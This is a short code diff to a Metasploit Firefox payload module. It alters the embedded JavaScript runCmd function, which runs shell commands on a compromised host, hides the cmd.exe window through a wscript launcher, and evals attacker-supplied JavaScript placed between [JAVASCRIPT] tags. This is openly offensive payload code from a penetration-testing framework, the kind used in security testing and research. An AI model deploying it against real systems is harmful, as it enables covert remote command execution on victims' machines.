@@ -47,7 +47,7 @@ module Msf::Payload::Firefox
   # redirects stdout. A JScript "launch" file is dropped and invoked with wscript
   # to run the command without displaying the cmd.exe prompt.
   #
-  # When the command contains the pattern ",JAVASCRIPT, ... ,ENDSCRIPT,", the
+  # When the command contains the pattern "[JAVASCRIPT] ... [/JAVASCRIPT]", the
   # javascript code between the tags is eval'd and returned.
   #
   # @return [String] javascript source code that exposes the runCmd(str) method.
@@ -59,18 +59,12 @@ module Msf::Payload::Firefox
       var svcs = Components.utils.import("resource://gre/modules/Services.jsm");
       var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
       var runCmd = function(cmd, cb) {
-        var echo = function(str) {
-          if(!str \|\| !str.length) return '';
-          var e = str.match(/echo ['"]?([^;\\s"']+)/);
-          return (e && e[1]) \|\| '';
-        }
-        var js = (/,JAVASCRIPT,([\\s\\S]*),ENDSCRIPT,/g).exec(cmd.trim());
+        if (cmd.trim().length == 0) return;
+
+        var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());
         if (js) {
-          var wcmd = (windows) ? cmd+"\\n" : '';
-          var cmds = cmd.split(js[0]).map(function(s){return s.trim().replace(/^\\s*;/, "")});
-          Function('cb', js[1])(function(r) {
-            cb(wcmd+echo(cmds[0])+"\\n"+r+"\\n"+echo(cmds[1]))
-          })
+          var tag = "[!JAVASCRIPT]";
+          Function('send', js[1])(function(r){ if (r) cb(r+tag+"\\n"); });
           return;
         }
 
